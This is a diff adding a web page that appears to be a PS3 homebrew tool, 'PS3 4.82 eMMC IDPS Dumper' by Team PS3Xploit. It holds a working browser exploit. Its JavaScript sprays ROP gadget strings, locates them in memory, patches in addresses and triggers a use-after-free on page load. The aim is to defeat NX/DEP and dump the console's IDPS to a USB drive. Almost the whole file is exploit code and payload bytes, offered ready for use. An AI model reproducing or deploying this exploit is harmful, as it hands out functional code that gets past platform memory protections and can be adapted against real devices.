@@ -1,0 +1,177 @@
+<html>
+<script src="include/utils.js"></script>
+<script src="include/exp_rel.js"></script>
+<head>
+<script>
+function initROP()
+{
+	try
+	{
+		var log_div = logEntry();
+		var used_offsets_arr = [80000000];
+		var usb_fp_rosdump,gadgets,jump_2,jump_1;
+		var usb_fp_rosdump_addr=0,gadgets_addr=0,jump_2_addr=0,jump_1_addr=0;
+		var usb_fp_rosdump_bytecount=0x20*2;
+		var gadgets_bytecount=0x320*2;
+		var jump_2_bytecount=0x24*2;
+		var jump_1_bytecount=0x4*2;
+		var search_max_threshold = 36*0x100000;
+		var search_base_offset = 0x80180000;
+		var search_range_size = 0xF8000;
+		var ph = 0x7EFD;
+		usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u6964\u7073\u2E62\u696E\u0000\u7762\u0000\u0000\u4141");
+		usb_fp_rosdump+=unescape("\u4141\u4141\u4141\u000D\u9684\u006F\u5550\u0000\uFFFF\uFFFF\u4141\u4141\u4141\u4141\u4141\uFD7E");
+		do
+		{
+			if(search_max_threshold<search_range_size){logAdd("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
+			usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(ph));
+			usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,search_base_offset,search_range_size,ph,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
+			var diff=0;
+			if(usb_fp_rosdump_addr>0){diff=usb_fp_rosdump_addr-search_base_offset;}
+			search_max_threshold-=search_range_size-diff;
+		}while(usb_fp_rosdump_addr==0);
+		var readlen_addr=usb_fp_rosdump_addr-0x12;
+		var dev_handle_addr=usb_fp_rosdump_addr-0x8;
+		var usb_fp_addr=usb_fp_rosdump_addr+0x00;
+		var wb_addr=usb_fp_rosdump_addr+0x16;
+		var sso_addr=usb_fp_rosdump_addr+0x24;
+		logAdd("Searching memory range for gadgets string offset....", log_div);
+		gadgets= unescape("\u0102\u0009\u7604\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364");
+		gadgets+=unescape("\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728");
+		gadgets+=unescape("\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8B00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0060\uEF38\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192");
+		gadgets+=unescape("\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556");
+		gadgets+=unescape("\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\uFF29\uFF29\uFF29");
+		gadgets+=unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8B00\u0100\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u0000\u0000\u0019\uD3B0\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384");
+		gadgets+=unescape("\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u8586\u8788");
+		gadgets+=unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u0100\u0000\u0000\u0001\u7576\u7778\u7980\u8182\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112");
+		gadgets+=unescape("\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576");
+		gadgets+=unescape("\u7778\u7980\u8182\u0000\u025A\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0001\u0000\u0204\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29");
+		gadgets+=unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\uFF31\uFF31\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304");
+		gadgets+=unescape("\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768");
+		gadgets+=unescape("\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8B00\u0200\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u0062\u8594\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132");
+		gadgets+=unescape("\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596");
+		gadgets+=unescape("\u9798\u9900\u0102\u0304\u0506\u0000\u0259\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u0000\u0000\uFF29\uFF29\u4748\u4950\u5152\u5354\u0000\u0000\uFF31");
+		gadgets+=unescape("\uFF31\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u0042\uC778\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324");
+		gadgets+=unescape("\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u0000\u0000\u8B00");
+		gadgets+=unescape("\u0300\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0000\u0000\u0060\uEF38\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152");
+		gadgets+=unescape("\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\uFF11\uFF11\uFF10\uFF10\uFF08");
+		gadgets+=unescape("\uFF08\uFF07\uFF07\uFF06\uFF06\u0000\u0010\uFF04\uFF04\uFF03\uFF03\uFF09\uFF09\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000\u0000\u0010\u0000\u0000\uFF30\uFF30\u0000\u0000\uFF31");
+		gadgets+=unescape("\uFF31\u8384\u8586\u8788\u8990\uF10F\u9394\u9596\u9798\u0000\u0000\u0001\u3B74\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344");
+		gadgets+=unescape("\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\uFF31");
+		gadgets+=unescape("\uFF31\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u0000\u0000\u0042\u3B18\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970");
+		gadgets+=unescape("\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334");
+		gadgets+=unescape("\u3536\u3738\u3940\u4142\u4344\u0000\u0000\u8B00\u0400\u0000\u0000\u0042\u3B18\u0000\u0000\u8B00\u0500\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u0000\u0000\u000C\u5234\u9394\u9596\u2F2A");
+		gadgets=gadgets.replaceAt(0x11A/2,hexh2bin(dev_handle_addr>>16));
+		gadgets=gadgets.replaceAt(0x11C/2,hexh2bin(dev_handle_addr));
+		gadgets=gadgets.replaceAt(0x126/2,hexh2bin(sso_addr>>16));
+		gadgets=gadgets.replaceAt(0x128/2,hexh2bin(sso_addr));
+		gadgets=gadgets.replaceAt(0x24E/2,hexh2bin(readlen_addr>>16));
+		gadgets=gadgets.replaceAt(0x250/2,hexh2bin(readlen_addr));
+		gadgets=gadgets.replaceAt(0x252/2,hexh2bin(0x8D000000>>16));
+		gadgets=gadgets.replaceAt(0x254/2,hexh2bin(0x8D000000));
+		gadgets=gadgets.replaceAt(0x28E/2,hexh2bin(dev_handle_addr>>16));
+		gadgets=gadgets.replaceAt(0x290/2,hexh2bin(dev_handle_addr));
+		gadgets=gadgets.replaceAt(0x3BE/2,hexh2bin(dev_handle_addr>>16));
+		gadgets=gadgets.replaceAt(0x3C0/2,hexh2bin(dev_handle_addr));
+		gadgets=gadgets.replaceAt(0x4CE/2,hexh2bin(wb_addr>>16));
+		gadgets=gadgets.replaceAt(0x4D0/2,hexh2bin(wb_addr));
+		gadgets=gadgets.replaceAt(0x4D2/2,hexh2bin(usb_fp_addr>>16));
+		gadgets=gadgets.replaceAt(0x4D4/2,hexh2bin(usb_fp_addr));
+		gadgets=gadgets.replaceAt(0x4F6/2,hexh2bin((0x8D000000+0x70)>>16));
+		gadgets=gadgets.replaceAt(0x4F8/2,hexh2bin((0x8D000000+0x70)));
+		gadgets=gadgets.replaceAt(0x4FE/2,hexh2bin(usb_fp_addr>>16));
+		gadgets=gadgets.replaceAt(0x500/2,hexh2bin(usb_fp_addr));
+		ph = 0x2A2F;
+		do
+		{
+			if(search_max_threshold<search_range_size){logAdd("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
+			gadgets=gadgets.replaceAt(0x000/2,hexh2bin(ph));
+			gadgets_addr=findJsVariableOffset("gadgets",gadgets,search_base_offset,search_range_size,ph,gadgets_bytecount/2,used_offsets_arr, log_div);
+			var diff=0;
+			if(gadgets_addr>0){diff=gadgets_addr-search_base_offset;}
+			search_max_threshold-=search_range_size-diff;
+		}while(gadgets_addr==0);
+		jump_2=unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950");
+		jump_2+=unescape("\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
+		jump_2=jump_2.replaceAt(0x32/2,hexh2bin(gadgets_addr>>16));
+		jump_2=jump_2.replaceAt(0x34/2,hexh2bin(gadgets_addr));	
+		search_range_size = 0x450000;
+		ph = 0x7EFB;
+		do
+		{
+			if(search_max_threshold<search_range_size){logAdd("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
+			jump_2=jump_2.replaceAt(0x00/2,hexh2bin(ph));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,ph,jump_2_bytecount/2,used_offsets_arr, log_div);
+			var diff=0;
+			if(jump_2_addr>0){diff=jump_2_addr-search_base_offset;}
+			search_max_threshold-=search_range_size-diff;
+		}while(jump_2_addr==0);
+		jump_1=unescape("\u4141\u4141\u4141\uFA7E");
+		jump_1=jump_1.replaceAt(0x02/2,hexh2bin(jump_2_addr>>16));
+		jump_1=jump_1.replaceAt(0x04/2,hexh2bin(jump_2_addr));	
+		ph = 0x7EFA;
+		do
+		{
+			if(search_max_threshold<search_range_size){logAdd("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
+			jump_1=jump_1.replaceAt(0x00/2,hexh2bin(ph));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,ph,jump_1_bytecount/2,used_offsets_arr, log_div);
+			var diff=0;
+			if(jump_1_addr>0){diff=jump_1_addr-search_base_offset;}
+			search_max_threshold-=search_range_size-diff;
+		}while(jump_1_addr==0);
+		logAdd("Summary:");
+		logAdd("rosdump variable offset: 0x"+usb_fp_rosdump_addr.toString(16), log_div);
+		logAdd("gadget: "+bytesToHex(usb_fp_rosdump), log_div);
+		logAdd("gadgets variable offset: 0x"+gadgets_addr.toString(16), log_div);
+		logAdd("gadget: "+bytesToHex(gadgets), log_div);
+		logAdd("jump_2 variable offset: 0x"+jump_2_addr.toString(16), log_div);
+		logAdd("gadget: "+bytesToHex(jump_2), log_div);
+		logAdd("jump_1 variable offset: 0x"+jump_1_addr.toString(16), log_div);
+		logAdd("gadget: "+bytesToHex(jump_1), log_div);
+		logAdd("Dumped IDPS To /dev_usb000/idps.bin", log_div);
+		trigger(jump_1_addr);
+		console.log(s2hex(usb_fp_rosdump), log_div);
+		console.log(s2hex(gadgets), log_div);
+		console.log(s2hex(jump_2), log_div);
+		console.log(s2hex(jump_1), log_div);
+		setTimeout(writeEnvInfo,0,document.getElementById('footer'));
+		return;
+	} 
+	catch(e)
+	{
+		logAdd(e, log_div);
+	}
+}
+</script>
+</head>
+<body id="BodyID" onload="setTimeout(initROP,0);">
+	<div id="HeaderID" style="color:#000000">
+	<h1>PS3 4.82 eMMC IDPS Dumper v0.2.3 by Team PS3Xploit</h1>
+	<font color="#00AA00">
+	<h3>Supports OFW and CFW CEX Firmware</h3>
+	<h3>Supports SuperSlim Models 40xxA/42xxA/43xxA</h3>
+	</font>
+	<b>
+	<p>Courtesy of: <br>
+	W (Javascript, Research & Testing)<br>
+	esc0rtd3w (Debugging, Research & Testing)<br>
+	bguerville (ROP Chaining/Javascript & Debugging)<br/><br/></b>
+	The code was heavily modified but the userland memory leak exploit poc by xerpi provided a perfect basis for this work.
+	Another UAF exploit was added onto it in order to get userland code execution via ROP to defeat NX (DEP).
+	With many thanks to Joonie & zecoxao for their regular advice, friendly support & extra testing...<br><br>
+	More details & news on <a href="http://www.psx-place.com">http://www.psx-place.com</a><br>
+	</div>
+	<br>
+	<h2><font color="red"><b>** MAKE SURE FLASH DRIVE IS IN FAR RIGHT SLOT USB000 **</font></b></h2>
+	<br>
+	<br>
+	<i><h2><b>PLEASE REMAIN PATIENT UNTIL CONSOLE BEEPS AND POWERS DOWN!</b></h2>
+	<h2><b>THIS MAY TAKE A FEW SECONDS TO A FEW MINUTES</b></h2></i><br>
+	<h2><b>Once PS3 has powered down, your IDPS will be located at /dev_usb000/idps.bin</b></h2>
+	<br>
+	<div id="exploit" ></div><br>
+	<div id="log"></div><br>
+	<div id="trigger"></div><br>
+	<div id="footer" style="color:#00AA00"></div><br>
+</body>
+</html>
